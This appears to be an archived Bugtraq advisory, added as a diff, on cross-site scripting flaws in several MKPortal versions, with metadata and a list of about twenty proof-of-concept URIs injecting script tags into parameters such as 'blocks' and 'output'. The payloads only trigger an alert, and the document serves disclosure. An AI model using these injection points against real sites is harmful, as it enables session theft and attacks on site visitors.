@@ -1,0 +1,107 @@
+#SpeeDr00t@Black Falcon<br>#bid36216<p><b><span style="font-size: 18pt;">MKPortal Multiple Modules Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/36216/info">info</a><br><a href="http://www.securityfocus.com/bid/36216/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/36216/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/36216/solution">solution</a><br><a href="http://www.securityfocus.com/bid/36216/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				36216
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 31 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 02 2009 05:12PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Inj3ct0r
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					MKPortal MKPortal 1.2.2 <br/>
+					
+				
+					MKPortal MKPortal 1.2.1 <br/>
+					
+				
+					MKPortal MKPortal 1.1.1 <br/>
+					
+				
+					MKPortal MKPortal 1.0.1 Final<br/>
+					
+				
+					MKPortal MKPortal  1.1 RC1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues by enticing an unsuspecting victim to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/index.php?ind=gbook&amp;amp;content=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/index.php?ind=gbook&amp;amp;blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/index.php?ind=gbook&amp;amp;message=%3Cscript%3Ealert(1)%3C/script%3E<br/>http://www.example.com/index.php?ind=whois&amp;amp;blocks=%3Cscript%3Ealert(1)%3C/script%3E<br/>http://www.example.com/index.php?ind=lenta&amp;amp;output=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/index.php?ind=lenta&amp;amp;blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/metric/?output=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/metric/?error=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/metric/?blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/index.php?ind=recommend&amp;amp;blocks=%3Cscript%3Ealert(1)%3C/script%3E<br/>http://www.example.com/Anekdot/?output=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/Anekdot/?blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/Anekdot/?contents=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/contact/index.php?blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/contact/mail.php?to=1@1.1&amp;amp;mess=2&amp;amp;subj=3&amp;amp;headers=4&amp;amp;name=5&amp;amp;teme=6&amp;amp;soob=7&amp;amp;email=2@2.2&amp;amp;output=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/contact/mail.php?to=1@1.1&amp;amp;mess=2&amp;amp;subj=3&amp;amp;headers=4&amp;amp;name=5&amp;amp;teme=6&amp;amp;soob=7&amp;amp;email=2@2.2&amp;amp;blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/speed/?output=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/speed/?blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/index.php?ind=horoscop&amp;amp;blocks=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/index.php?ind=horoscop&amp;amp;output=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/catphones/index.php?output=%3Cscript%3Ealert(1)%3C/script%3E <br/>http://www.example.com/catphones/index.php?blocks=%3Cscript%3Ealert(1)%3C/script%3E
+	
+		<ul>
+</ul>
+</div>
